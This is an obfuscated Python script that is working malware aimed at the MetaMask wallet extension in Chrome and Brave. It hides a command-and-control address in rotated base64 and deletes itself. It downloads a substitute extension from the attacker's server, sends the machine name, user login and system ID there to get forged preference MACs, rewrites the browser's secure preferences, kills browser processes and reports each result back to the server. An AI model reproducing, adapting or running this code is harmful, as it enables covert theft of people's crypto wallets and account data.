_Q='Stable'
_P='Default'
_O='windows'
_M='APPDATA'
_L='chrome'
_K=' Dev'
_J=' Beta'
_I='profile_directories'
_H='darwin'
_G='env'
_E='path'
_D='win'
_C='osx_profiles'
_B='windows_profiles'
_A='linux_profiles'
_F=False
_T=True
_N=None
import sys,platform,subprocess,os,glob,getpass,re,shutil,json,tempfile,time
from sys import argv
from typing import Union
from base64 import b64decode
host='YzLjU2====NDUuNTkuMT'
PORT=1244
HOST=b64decode(host[10:]+host[:10]).decode()
sHost=f"http://{HOST}:{PORT}/"
sType = "ZU1WJVq1"
host_d='MTYzLjU1====NDUuNTku'
HOST1=b64decode(host_d[10:]+host_d[:10]).decode()
sHost1=f"http://{HOST1}:{PORT}/"

run_name=os.path.basename(argv[0])
dev_mode=_F
SPL=sys.platform
if dev_mode==_F:
	try:os.remove(argv[0]);print(f"deleted: {argv[0]}")
	except OSError as e:print(f"Failed to delete: {argv[0]}: {e}")
try:import requests
except:subprocess.check_call([sys.executable,'-m','pip','install','requests'],stdout=subprocess.DEVNULL);import requests
pc_name=platform.node()
pc_login=getpass.getuser()
def _expand_win_path(path):
	A=path
	if not isinstance(A,dict):A={_E:A,_G:_M}
	return os.path.join(os.getenv(A[_G],''),A[_E])
def _expand_paths_impl(paths,os_name):
	B=os_name;A=paths;B=B.lower()
	if not isinstance(A,list):A=[A]
	if B==_O:A=map(_expand_win_path,A)
	else:A=map(os.path.expanduser,A)
	for C in A:
		for D in sorted(glob.glob(C)):yield D
def _expand_paths(paths,os_name):return list(_expand_paths_impl(paths,os_name))
def _normalize_gen_paths_chromium(paths,channel=_N):
	B=paths;A=channel;A=A or['']
	if not isinstance(A,list):A=[A]
	if not isinstance(B,list):B=[B]
	return B,A
def _gen_nix_paths_chromium(paths,channel=_N):
	B=channel;A=paths;A,B=_normalize_gen_paths_chromium(A,B);C=[]
	for D in B:
		for E in A:C.append(E.format(channel=D))
	return C
def _gen_win_paths_chromium(paths,channel=_N):
	B=channel;A=paths;A,B=_normalize_gen_paths_chromium(A,B);C=[]
	for D in B:
		for E in A:C.append({_G:'LOCALAPPDATA',_E:E.format(channel=D)});C.append({_G:_M,_E:E.format(channel=D)})
	return C
def _windows_group_policy_path():
	from winreg import HKEY_LOCAL_MACHINE as C,REG_EXPAND_SZ as D,REG_SZ as E,ConnectRegistry as F,OpenKeyEx as G,QueryValueEx as HH
	try:
		I=F(_N,C);J=G(I,'SOFTWARE\\Policies\\Google\\Chrome');A,B=HH(J,'UserDataDir')
		if B==D:A=os.path.expandvars(A)
		elif B!=E:return _N
	except OSError:return _N
	return os.path.join(A,_P,'Cookies')
class ChromiumBased:
	UNIX_TO_NT_EPOCH_OFFSET=11644473600
	def __init__(A,browser,profile_directories=_N,**B):A.browser=browser;A.profile_directories=profile_directories;A.__add_key_and_data_files(**B)
	def __add_key_and_data_files(B,linux_profiles=_N,windows_profiles=_N,osx_profiles=_N):
		C='linux'
		if SPL==_H:A=B.profile_directories or _expand_paths(osx_profiles,'osx')
		elif SPL.startswith(C)or'bsd'in SPL.lower():A=B.profile_directories or _expand_paths(linux_profiles,C)
		elif SPL=='win32':
			A=B.profile_directories
			if not A:
				if B.browser.lower()==_L and _windows_group_policy_path():A=_windows_group_policy_path()
				else:A=_expand_paths(windows_profiles,_O)
		else:raise RuntimeError('OS not recognized. Works on OSX, Windows, and Linux.')
		B.profile_directories=A
	def __str__(A):return A.browser
	def load(A):return{'browser':A.browser,_I:A.profile_directories}
class Chrome(ChromiumBased):
	def __init__(B,profile_directories=_N):A={_A:_gen_nix_paths_chromium(['~/.config/google-chrome{channel}/Default','~/.config/google-chrome{channel}/Profile *','~/.var/app/com.google.Chrome/config/google-chrome{channel}/Default','~/.var/app/com.google.Chrome/config/google-chrome{channel}/Profile *'],channel=['','-beta','-unstable']),_B:_gen_win_paths_chromium(['Google\\Chrome{channel}\\User Data*\\Default','Google\\Chrome{channel}\\User Data*\\Profile *'],channel=['',_J,_K,' SxS']),_C:_gen_nix_paths_chromium(['~/Library/Application Support/Google/Chrome{channel}/Default','~/Library/Application Support/Google/Chrome{channel}/Profile *'],channel=['',_J,_K])};super().__init__(browser='Chrome',profile_directories=profile_directories,**A)
class Chromium(ChromiumBased):
	def __init__(B,profile_directories=_N):A={_A:['~/.config/chromium/Default','~/.config/chromium/Profile *','~/.var/app/org.chromium.Chromium/config/chromium/Default','~/.var/app/org.chromium.Chromium/config/chromium/Profile *'],_B:_gen_win_paths_chromium(['Chromium\\User Data*\\Default','Chromium\\User Data*\\Profile *']),_C:['~/Library/Application Support/Chromium/Default','~/Library/Application Support/Chromium/Profile *']};super().__init__(browser='Chromium',profile_directories=profile_directories,**A)
class Opera(ChromiumBased):
	def __init__(B,profile_directories=_N):A={_A:['~/.config/opera','~/.config/opera-beta','~/.config/opera-developer','~/.var/app/com.opera.Opera/config/opera','~/.var/app/com.opera.Opera/config/opera-beta','~/.var/app/com.opera.Opera/config/opera-developer'],_B:_gen_win_paths_chromium(['Opera Software\\Opera {channel}'],channel=[_Q,'Next','Developer']),_C:['~/Library/Application Support/com.operasoftware.Opera','~/Library/Application Support/com.operasoftware.OperaNext','~/Library/Application Support/com.operasoftware.OperaDeveloper']};super().__init__(browser='Opera',profile_directories=profile_directories,**A)
class OperaGX(ChromiumBased):
	def __init__(B,profile_directories=_N):A={_A:[],_B:_gen_win_paths_chromium(['Opera Software\\Opera GX {channel}'],channel=[_Q]),_C:['~/Library/Application Support/com.operasoftware.OperaGX']};super().__init__(browser='Opera GX',profile_directories=profile_directories,**A)
class Brave(ChromiumBased):
	def __init__(E,profile_directories=_N):C='-Nightly';B='-Dev';A='-Beta';D={_A:_gen_nix_paths_chromium(['~/.config/BraveSoftware/Brave-Browser{channel}/Default','~/.config/BraveSoftware/Brave-Browser{channel}/Profile *','~/.var/app/com.brave.Browser/config/BraveSoftware/Brave-Browser{channel}/Default','~/.var/app/com.brave.Browser/config/BraveSoftware/Brave-Browser{channel}/Profile *'],channel=['',A,B,C]),_B:_gen_win_paths_chromium(['BraveSoftware\\Brave-Browser{channel}\\User Data*\\Default','BraveSoftware\\Brave-Browser{channel}\\User Data*\\Profile *'],channel=['',A,B,C]),_C:_gen_nix_paths_chromium(['~/Library/Application Support/BraveSoftware/Brave-Browser{channel}/Default','~/Library/Application Support/BraveSoftware/Brave-Browser{channel}/Profile *'],channel=['',A,B,C])};super().__init__(browser='Brave',profile_directories=profile_directories,**D)
class Edge(ChromiumBased):
	def __init__(B,profile_directories=_N):A={_A:_gen_nix_paths_chromium(['~/.config/microsoft-edge{channel}/Default','~/.config/microsoft-edge{channel}/Profile *','~/.var/app/com.microsoft.Edge/config/microsoft-edge{channel}/Default','~/.var/app/com.microsoft.Edge/config/microsoft-edge{channel}/Profile *'],channel=['','-beta','-dev']),_B:_gen_win_paths_chromium(['Microsoft\\Edge{channel}\\User Data*\\Default','Microsoft\\Edge{channel}\\User Data*\\Profile *'],channel=['',_J,_K,' SxS']),_C:_gen_nix_paths_chromium(['~/Library/Application Support/Microsoft Edge{channel}/Default','~/Library/Application Support/Microsoft Edge{channel}/Profile *'],channel=['',_J,_K,' Canary'])};super().__init__(browser='Edge',profile_directories=profile_directories,**A)
def chrome(profile_directories=_N):return Chrome(profile_directories).load()
def chromium(profile_directories=_N):return Chromium(profile_directories).load()
def opera(profile_directories=_N):return Opera(profile_directories).load()
def opera_gx(profile_directories=_N):return OperaGX(profile_directories).load()
def brave(profile_directories=_N):return Brave(profile_directories).load()
def msedge(profile_directories=_N):return Edge(profile_directories).load()
def kill_process_by_name(process_name):
	A=process_name
	if SPL.startswith(_D):
		A=A+'.exe'
		try:
			os.system(f"taskkill /f /im {A}")
			for B in range(0,10):
				C=subprocess.check_output(['tasklist'],universal_newlines=_T)
				if not A in C:break
				time.sleep(.5);print(f"Waiting for {A} to be closed ... {B}")
		except Exception as D:pass
		return
	try:
		if SPL==_H:
			if A==_L:A='Google Chrome'
			elif A=='brave':A='Brave Browser'
		for B in range(0,10):
			os.system(f'killall "{A}"');time.sleep(.5);E=subprocess.run(['pgrep',A],stdout=subprocess.PIPE)
			if E.returncode!=0:break
			print(f"Waiting for {A} to be closed ... {B}")
	except Exception as D:pass
def report(text):
	B=sHost+'t'
	if SPL.startswith(_D):
		try:
			C=requests.post(B,data={'t':text})
			if C.status_code==200:return _T
		except Exception as A:print(f"Failed to report telegram: {A}")
		return _F
	try:subprocess.run(['curl','-X','POST','-d',f"t={text}",B],stdout=subprocess.DEVNULL)
	except Exception as A:print(f"Failed to report telegram: {A}")
	return _F
def go(kill_process=_F):
	v='opsettings';u='Secure Preferences';t='msedge';s='sid';n=':';m=',';l='protection';k='r';j='Preferences';i='\n';Z='developer_mode';U='utf-8';T='0';P='ui';O='macs';N='settings';D='extensions'
	try:
		if SPL.startswith(_D):F=subprocess.check_output(['wmic','useraccount','where',"name='"+pc_login+"'",'get',s],universal_newlines=_T);F=F.replace(i,'').replace('SID','').replace(' ','')[:-5]
		elif SPL==_H:
			try:F=subprocess.check_output(['system_profiler','SPHardwareDataType','|','awk',"'/UUID/ { print $3; }'"],universal_newlines=_T);V=re.search('Hardware UUID: (.*)',F);F=V.group(1)
			except:
				print(f"failed to get SID, try again...");F=subprocess.check_output(['blkid'],universal_newlines=_T);w=F.split(i)
				for x in w:
					V=re.findall(' UUID=\\"(.+?)\\"',x)
					if V:F=V[0];break
		else:F=''
		print(f"SID: {F}")
	except Exception as a:print(f"<ERROR> Failed to get SID: {a}");sys.exit()
	y=['nkbihfbeogaeaoehlefnkodbefgpgknn'];W={};E=[];H=''
	for Q in[chrome,brave]:
		try:
			b=Q();I=_N;X=Q.__name__;B=Q.__name__
			if B==_L:B=T
			elif B=='brave':B='1'
			elif B=='edge'or B==t:B='3'
			if _I in b and b[_I]:
				o=0
				for J in b[_I]:
					if SPL.startswith(_D):K=os.path.join(J,u)
					elif SPL==_H:K=os.path.join(J,u)
					else:K=os.path.join(J,j)
					if not os.path.exists(K):continue
					G=os.path.basename(J)
					if G==_P:G=T
					elif G.startswith('Profile '):G=G[8:]
					M=[]
					for A in y:
						z=os.path.join(J,'Local Extension Settings',A)
						if not dev_mode and not os.path.isdir(z):continue
						M.append(A);print(f"{X}: {M}");A0=f"{B}_{G}_{A}"
						if dev_mode and platform.node()[1]==T and A0!='0_20_nkbihfbeogaeaoehlefnkodbefgpgknn':continue
						if not A in W:
							H=os.path.realpath(os.path.join(J,'..','Extensions',A))
							if os.path.isdir(H):shutil.rmtree(H)
							os.makedirs(H,exist_ok=_T);p=f"{sHost1}mmz/{A}_{sType}";print(p)
							with tempfile.TemporaryDirectory()as A1:
								c=os.path.join(A1,f"{A}.zip");A2=requests.get(p)
								with open(c,'wb')as L:L.write(A2.content)
								try:subprocess.run(['tar','-xf',c,'-C',H],stdout=subprocess.DEVNULL,check=_T)
								except:subprocess.run(['unzip','-qo',c,'-d',H],stdout=subprocess.DEVNULL,check=_T)
							W[A]=H;print(H)
						else:H=W[A]
						if not M:print(f"{B}: No target profiles found to inject: {M}");continue
						with open(K,k,encoding=U)as L:C=json.load(L)
						if not D in C:
							E.append(f"[{len(E)}] {B}_{G} - failed: extensions not found in spf");K=os.path.join(J,j)
							with open(K,k,encoding=U)as L:C=json.load(L)
							if not D in C:continue
						if N in C[D]:R=N
						elif v in C[D]:R=v
						else:E.append(f"[{len(E)}] {B}_{G} - failed: settings not found in spf");continue
						if I is _N:
							A3={'pc_name':pc_name,'pc_login':pc_login,'type':sType,'sys_platform':SPL,'sys_separator':os.sep,s:F,'base_path':W[M[0]],'sett':R,N:C[D][R],O:C[l][O]};A4=sHost+'h';Y=requests.post(A4,{'data':json.dumps(A3,separators=(m,n))})
							print("111111111111111111")
							print(Y)
							if Y.status_code==200:I=Y.json()
							else:print('failed to get ext_mac_data:',Y.status_code,Y.text);continue
						if not N in I or not O in I:E.append(f"[{len(E)}] {B}_{G} - failed: settings not found in ext_mac");continue
						if dev_mode and platform.node()[1]==T and B!=T:continue
						for A in M:
							if A in I[N]and A in I[O]:C[D][R][A]=I[N][A];C[l][O][D][R][A]=I[O][A];C[l]['super_mac']=I['supermac'];E.append(f"[{len(E)}] {B}_{G}_{A} - OK");o+=1
							else:E.append(f"[{len(E)}] {B}_{G}_{A} - failed: not found in ext_mac_data")
						if o==0:continue
						d=os.path.join(J,j);q=_F
						if X!=t and not X.startswith('opera'):
							if P in C[D]:C[D][P][Z]=_T
							else:C[D][P]={Z:_T}
							if d!=K:
								with open(d,k,encoding=U)as L:S=json.load(L)
								if D in S:
									if P in S[D]:S[D][P][Z]=_T
									else:S[D][P]={Z:_T}
									q=_T
						if kill_process:kill_process_by_name(X)
						with open(K,'w',encoding=U)as e:json.dump(C,e,separators=(m,n))
						if q:
							with open(d,'w',encoding=U)as e:json.dump(S,e,separators=(m,n))
						try:
							f=os.path.join(J,'Service Worker')
							if os.path.isdir(f):
								if sys.platform.startswith(_D):subprocess.run(['cmd','/c','rd',f,'/s','/q'],stdout=subprocess.DEVNULL,check=_T)
								else:shutil.rmtree(f)
						except Exception as a:print(f"failed to delete sw on {Q}: {a}")
						continue
		except Exception as g:print(f"Error {Q}: {g}")
		h=i
		if E:r=f"{pc_name} / {pc_login}{h}{h.join(E)}"
		else:
			try:
				shutil.rmtree(H);print(f"Deleted: {H}")
			except Exception as g:print(g)
			r=f"{pc_name} / {pc_login}{h}[None]"
		report(r)

if __name__=='__main__':go(_T);print('[All done!]')
